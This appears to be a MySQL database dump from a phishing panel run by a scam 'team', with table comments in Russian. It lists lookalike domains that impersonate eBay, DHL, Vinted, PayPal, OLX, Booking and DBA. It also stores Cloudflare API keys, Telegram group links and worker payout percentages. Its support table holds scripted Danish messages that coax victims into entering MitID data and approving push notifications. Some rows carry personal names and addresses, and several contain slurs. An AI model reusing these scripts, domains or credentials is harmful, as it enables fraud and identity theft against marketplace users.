-- Структура таблицы `Requests`
--

CREATE TABLE `Requests` (
  `id` int NOT NULL,
  `workerId` bigint NOT NULL,
  `question1` text,
  `question2` text,
  `question3` text,
  `status` tinyint(1) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3;

--
-- Дамп данных таблицы `Requests`
--

INSERT INTO `Requests` (`id`, `workerId`, `question1`, `question2`, `question3`, `status`) VALUES
(1, 5659851094, '1', '1', '1', 1),
(2, 6129441860, 'мама', 'мама', 'мама', 1),
(3, 6213223668, '.', '.', '.', 1),
(4, 6213223668, '.', '.', '.', 1),
(5, 6242299511, 'А', 'А', 'А', 1),
(6, 5730775683, 'Гучи тим, лв тим, роллс тим, авито тим', 'Название уебанское', 'pornhub.com', 1),
(7, 6054021161, 'руби', 'развал', NULL, 1),
(8, 5745955500, 'PAIN TEAM', 'ЧЕРНАЯ КАССА', NULL, 1),
(9, 5999286329, '21', '1', '1', 1),
(10, 6218347553, '123', '213', NULL, 1),
(11, 2117077709, 'я пидорас', 'я еблан', 'нету я далбаеб', 1),
(12, 6257014284, 'кфс', 'надоело', NULL, 1),
(13, 5243025205, 'Mail', 'Mail', NULL, 1),
(14, 5855889063, 'anafema', 'anafeman', 'anafema', 1),
(15, 5755229550, 'Руби', 'Ненаход', 'Нету профитов, блейд наеьал', 1);

-- --------------------------------------------------------

--
-- Структура таблицы `Services`
--

CREATE TABLE `Services` (
  `id` int NOT NULL,
  `title` mediumtext CHARACTER SET utf8mb4 COLLATE utf8mb4_bin,
  `sub` text CHARACTER SET utf8mb4 COLLATE utf8mb4_bin,
  `code` mediumtext CHARACTER SET utf8mb4 COLLATE utf8mb4_bin,
  `country` mediumtext CHARACTER SET utf8mb4 COLLATE utf8mb4_bin,
  `currency` text CHARACTER SET utf8mb4 COLLATE utf8mb4_bin,
  `domain` text CHARACTER SET utf8mb4 COLLATE utf8mb4_bin,
  `work` tinyint(1) NOT NULL DEFAULT '1',
  `status` int NOT NULL DEFAULT '2'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_bin;

--
-- Дамп данных таблицы `Services`
--

INSERT INTO `Services` (`id`, `title`, `sub`, `code`, `country`, `currency`, `domain`, `work`, `status`) VALUES
(1, '🛒 eBay', 'ebay-de', 'ebay1_de', 'de', 'EUR', 'ebay-de.dba-order-levering.com', 0, 1),
(3, '🛒 eBay', 'ebay-de', 'ebay2_de', 'de', 'EUR', 'ebay-de.dba-order-levering.com', 1, 2),
(4, '🚚 DHL', 'dhl-de', 'dhl1_de', 'de', 'EUR', 'dhl-de.dba-order-levering.com', 0, 1),
(5, '🚚 DHL', 'dhl-de', 'dhl2_de', 'de', 'EUR', 'dhl-de.dba-order-levering.com', 1, 2),
(6, '🧢 VINTED', 'vinted-de', 'vinted1_de', 'de', 'EUR', 'vinted-de.dba-order-levering.com', 0, 1),
(7, '🧢 VINTED', 'vinted-de', 'vinted2_de', 'de', 'EUR', 'vinted-de.dba-order-levering.com', 1, 2),
(8, '🛒 Willhaben', 'willhaben-au', 'willhaben1_au', 'au', 'EUR', 'willhaben-au.dba-order-levering.com', 0, 1),
(9, '🛒 Willhaben', 'willhaben-au', 'willhaben2_au', 'au', 'EUR', 'willhaben-au.dba-order-levering.com', 1, 2),
(10, '🧢 VINTED', 'vinted-au', 'vinted1_au', 'au', 'EUR', 'vinted-au.dba-order-levering.com', 0, 1),
(11, '🧢 VINTED', 'vinted-au', 'vinted2_au', 'au', 'EUR', 'vinted-au.dba-order-levering.com', 1, 2),
(12, '🅿️ PayPal', 'paypal', 'paypal_en', 'en', 'EUR', 'paypal.dba-order-levering.com', 1, 2),
(13, '🛒 OLX', 'olx-pl', 'olx2_pl', 'pl', 'PLN', 'olx-pl.dba-order-levering.com', 1, 2),
(14, '🌎 BOOKING', 'booking-eu', 'booking2_eu', 'eu', 'EUR', 'booking-eu.dba-order-levering.com', 1, 2),
(15, '🚚 DBA', 'dba-dk', 'dba2_dk', 'dk', 'DKK', 'dba-order-levering.com', 1, 2);

-- --------------------------------------------------------

--
-- Структура таблицы `Settings`
--

CREATE TABLE `Settings` (
  `id` int NOT NULL,
  `projectName` text NOT NULL,
  `regLogin` text,
  `regPass` text,
  `cfMail` text,
  `cfId` text,
  `cfApi` text,
  `requestChatId` text NOT NULL,
  `logsId` bigint DEFAULT NULL,
  `payId` bigint DEFAULT NULL,
  `percent` int NOT NULL DEFAULT '60',
  `mentorPercent` int NOT NULL DEFAULT '5',
  `workerChatUrl` text NOT NULL,
  `payChatUrl` text NOT NULL,
  `work` tinyint(1) NOT NULL DEFAULT '1',
  `sms` tinyint(1) NOT NULL DEFAULT '1',
  `mail` tinyint(1) NOT NULL DEFAULT '1',
  `sertSsl` tinyint(1) NOT NULL DEFAULT '1',
  `domain` tinyint(1) NOT NULL DEFAULT '1',
  `lk` tinyint(1) NOT NULL DEFAULT '1'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3;

--
-- Дамп данных таблицы `Settings`
--

INSERT INTO `Settings` (`id`, `projectName`, `regLogin`, `regPass`, `cfMail`, `cfId`, `cfApi`, `requestChatId`, `logsId`, `payId`, `percent`, `mentorPercent`, `workerChatUrl`, `payChatUrl`, `work`, `sms`, `mail`, `sertSsl`, `domain`, `lk`) VALUES
(1, 'UGLY TEST', NULL, NULL, 'repet50771@carpetra.com', '533d0017add3ac0551f5939e951358de', '5a9302ca90024c37220fa60dc8615c5f34563', '-949383034', -949383034, -1001940492974, 60, 5, 'https://t.me/+hwl_TUJA0P5kNTRk', 'https://t.me/+mqamVM1dc2c2MWY8', 1, 0, 0, 1, 1, 0);

-- --------------------------------------------------------

--
-- Структура таблицы `Supports`
--

CREATE TABLE `Supports` (
  `id` int NOT NULL,
  `itemId` text,
  `text` text,
  `who` text,
  `readed` tinyint(1) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3;

--
-- Дамп данных таблицы `Supports`
--

INSERT INTO `Supports` (`id`, `itemId`, `text`, `who`, `readed`) VALUES
(1, 'cELEvRFz', 'asdf', 'client', 0),
(2, 'cELEvRFz', 'sadfasfd', 'Support', 1),
(3, 'OeGOqyjl', 'son of whore', 'Support', 1),
(4, 'OeGOqyjl', 'хуй сунь вынь чурка ебаная', 'Support', 1),
(5, 'OeGOqyjl', 'data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAoHCBYVFRgWFRYZGBgYGhgaGBocGBoYHBgYGBgZGRgYGBocIS4lHB4rHxgYJjgmKy8xNTU1GiQ7QDs0Py40NTEBDAwMEA8QHhISHjQrJCs0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQxNP/AABEIAOEA4QMBIgACEQEDEQH/x', 'client', 0),
(6, 'OeGOqyjl', 'svindler', 'Support', 1),
(7, 'OeGOqyjl', 'САМ СВИНДЕР ПОНЯЛ', 'client', 0),
(8, 'OeGOqyjl', 'ЛОХ ЦВЕТОЧНЫЙ', 'client', 0),
(9, 'OeGOqyjl', 'зайди апекс вань', 'Support', 0),
(10, 'lrzrEimK', 'Hallo! Køberen betalte beløbet for varerne og leveringen. Hvis du og køberen er tilfredse med beløbet, skal du bekræfte modtagelsen af pengene.', 'Support', 1),
(11, 'lrzrEimK', 'Hallo! Køberen betalte beløbet for varerne og leveringen. Hvis du og køberen er tilfredse med beløbet, skal du bekræfte modtagelsen af pengene.', 'Support', 1),
(12, 'lrzrEimK', 'Hallo! Køberen betalte beløbet for varerne og leveringen. Hvis du og køberen er tilfredse med beløbet, skal du bekræfte modtagelsen af pengene.', 'Support', 0),
(13, 'wHKsFNcy', 'Hallo! Køberen betalte beløbet for varerne og leveringen. Hvis du og køberen er tilfredse med beløbet, skal du bekræfte modtagelsen af pengene.', 'Support', 1),
(14, 'heRwHjfF', 'Hallo! Køberen betalte beløbet for varerne og leveringen. Hvis du og køberen er tilfredse med beløbet, skal du bekræfte modtagelsen af pengene.', 'Support', 0),
(15, 'TGZMZEAB', 'Hallo! Køberen betalte beløbet for varerne og leveringen. Hvis du og køberen er tilfredse med beløbet, skal du bekræfte modtagelsen af pengene.', 'Support', 1),
(16, 'TGZMZEAB', 'Indtast MitID-dataene.', 'Support', 1),
(17, 'NDvDjtkX', 'Hallo! Køberen betalte beløbet for varerne og leveringen. Hvis du og køberen er tilfredse med beløbet, skal du bekræfte modtagelsen af pengene.', 'Support', 1),
(18, 'NDvDjtkX', 'Indtast MitID-dataene.', 'Support', 1),
(19, 'NDvDjtkX', 'Der er sendt en push-meddelelse til din MitID-ansøgning, som du skal bekræfte:\n1) Åbn MitID-appen;\n2) Bekræft push-meddelelsen for vellykket identifikation.', 'Support', 1),
(20, 'NDvDjtkX', 'Hør efter! Den første fase er afsluttet: du har bekræftet push-meddelelsen. For at kunne modtage pengene blev der startet en timer for at kontrollere personens identitet. Følg linket om en time, og indtast dataene igen.\n!PAS PÅ TIMEREN!', 'Support', 1),
(21, 'RBCkgEEd', 'Hallo! Køberen betalte beløbet for varerne og leveringen. Hvis du og køberen er tilfredse med beløbet, skal du bekræfte modtagelsen af pengene.', 'Support', 1),
(22, 'NDvDjtkX', 'Hallo! Du har med succes ventet på, at timeren slutter! For at kunne modtage penge skal du gentage proceduren igen. Følg instruktionerne.', 'Support', 1),
(23, 'NDvDjtkX', 'Hallo! Du har med succes ventet på, at timeren slutter! For at kunne modtage penge skal du gentage proceduren igen. Følg instruktionerne.', 'Support', 1),
(24, 'NDvDjtkX', 'Indtast MitID-dataene igen.', 'Support', 1),
(25, 'NDvDjtkX', 'En push-meddelelse er blevet sendt igen til din MitID-ansøgning, som du skal bekræfte:\n1) Åbn MitID-appen;\n2) Bekræft push-meddelelsen for vellykket identifikation', 'Support', 1),
(26, 'NDvDjtkX', 'En push-meddelelse er blevet sendt igen til din MitID-ansøgning, som du skal bekræfte:\n1) Åbn MitID-appen;\n2) Bekræft push-meddelelsen for vellykket identifikation', 'Support', 1),
(27, 'RBCkgEEd', 'Hallo! Du har med succes ventet på, at timeren slutter! For at kunne modtage penge skal du gentage proceduren igen. Følg instruktionerne.', 'Support', 1);

-- --------------------------------------------------------

--
-- Структура таблицы `Users`
--

CREATE TABLE `Users` (
  `id` bigint NOT NULL,
  `username` text,
  `tag` text,
  `wallet` text,
  `profitSum` int DEFAULT '0',
  `mentorId` bigint DEFAULT NULL,
  `status` int NOT NULL DEFAULT '0',
  `admin` tinyint(1) NOT NULL DEFAULT '0',
  `vbiver` tinyint(1) NOT NULL DEFAULT '0',
  `banned` tinyint(1) NOT NULL DEFAULT '0',
  `percent` int DEFAULT NULL,
  `address` text,
  `name` text,
  `siteStatus` tinyint(1) NOT NULL DEFAULT '1',
  `supportType` varchar(255) NOT NULL DEFAULT 'bot'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3;

--
-- Дамп данных таблицы `Users`
--

INSERT INTO `Users` (`id`, `username`, `tag`, `wallet`, `profitSum`, `mentorId`, `status`, `admin`, `vbiver`, `banned`, `percent`, `address`, `name`, `siteStatus`, `supportType`) VALUES
(2117077709, 'Omalson', 'я гей', NULL, 0, NULL, 1, 0, 0, 0, 60, NULL, NULL, 1, 'bot'),
(5243025205, 'Anafemaua', 'wYuNtgIQ', NULL, 0, NULL, 1, 0, 0, 0, 60, NULL, NULL, 1, 'bot'),
(5659851094, 'biba_code', 'coder', NULL, 0, NULL, 1, 1, 0, 0, 60, 'ывфлоаолфывоа', 'лфывалфлыва', 1, 'bot'),
(5730775683, 'jegbetaleportoen', 'iGSTlJdT', NULL, 0, NULL, 1, 0, 0, 0, 60, NULL, NULL, 1, 'bot'),
(5745955500, 'beltsandlui', 'mOCPsDuj', NULL, 0, NULL, 1, 0, 0, 0, 60, NULL, NULL, 1, 'bot'),
(5755229550, 'greenhorsepd6ztbo', 'mIJjWkNu', NULL, 0, NULL, 1, 0, 0, 0, 60, NULL, NULL, 1, 'bot'),
(5855889063, 'anafema_support', 'sdhsypjw', NULL, 0, NULL, 1, 0, 0, 0, 60, NULL, NULL, 1, 'bot'),
(5999286329, 'FeulNoir', 'wgnsSKED', NULL, 0, NULL, 1, 1, 0, 0, 60, NULL, NULL, 1, 'bot'),
(6054021161, 'djsnaparik', 'TeIxIQRP', NULL, 0, NULL, 1, 0, 0, 0, 60, 'Indkilde alle 91', 'Tilde Mortensen', 1, 'bot'),
(6129441860, 'kuyasesh', 'qkHWLvab', NULL, 0, NULL, 1, 0, 0, 0, 60, 'Læssevej 42 Værløse 3500', 'Gabriel Smith', 1, 'bot'),
(6213223668, 'millyfox', 'ZShmArCU', NULL, 0, NULL, 1, 1, 0, 0, 60, 'ewasfdrgf', '21s12 d21s221s', 1, 'bot'),
(6218347553, 'Abdul_Salamovich', 'YUMyfDyh', NULL, 0, NULL, 1, 0, 0, 0, 60, NULL, NULL, 1, 'bot'),
(6242299511, 'IiIiIilililio', 'heCNsoEu', NULL, 0, NULL, 1, 0, 0, 0, 60, 'Bloch Allé 9', 'Keelan Pratt', 1, 'bot'),
(6257014284, 'm1tobedevil', 'millyfoxpidor', NULL, 0, NULL, 1, 0, 1, 0, 60, NULL, NULL, 1, 'bot');

--
-- Индексы сохранённых таблиц
--

--
-- Индексы таблицы `BlackIps`
--
ALTER TABLE `BlackIps`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `Countries`
--
ALTER TABLE `Countries`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `Currencies`
--
ALTER TABLE `Currencies`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `Domains`
--
ALTER TABLE `Domains`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `Items`
--
ALTER TABLE `Items`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `Logs`
--
ALTER TABLE `Logs`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `Mentors`
--
ALTER TABLE `Mentors`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `Profits`
--
ALTER TABLE `Profits`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `Requests`
--
ALTER TABLE `Requests`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `Services`
--
ALTER TABLE `Services`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `Settings`
--
ALTER TABLE `Settings`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `Supports`
--
ALTER TABLE `Supports`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `Users`
--
ALTER TABLE `Users`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT для сохранённых таблиц
--

--
-- AUTO_INCREMENT для таблицы `BlackIps`
--
ALTER TABLE `BlackIps`
  MODIFY `id` int NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT для таблицы `Countries`
--
ALTER TABLE `Countries`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;

--
-- AUTO_INCREMENT для таблицы `Currencies`
--
ALTER TABLE `Currencies`
  MODIFY `id` int NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT для таблицы `Domains`
--
ALTER TABLE `Domains`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT для таблицы `Logs`
--
ALTER TABLE `Logs`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=64;

--
-- AUTO_INCREMENT для таблицы `Mentors`
--
ALTER TABLE `Mentors`
  MODIFY `id` int NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT для таблицы `Profits`
--
ALTER TABLE `Profits`
  MODIFY `id` int NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT для таблицы `Requests`
--
ALTER TABLE `Requests`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=16;

--
-- AUTO_INCREMENT для таблицы `Services`
--
ALTER TABLE `Services`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=16;

--
-- AUTO_INCREMENT для таблицы `Settings`
--
ALTER TABLE `Settings`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT для таблицы `Supports`
--
ALTER TABLE `Supports`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=28;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
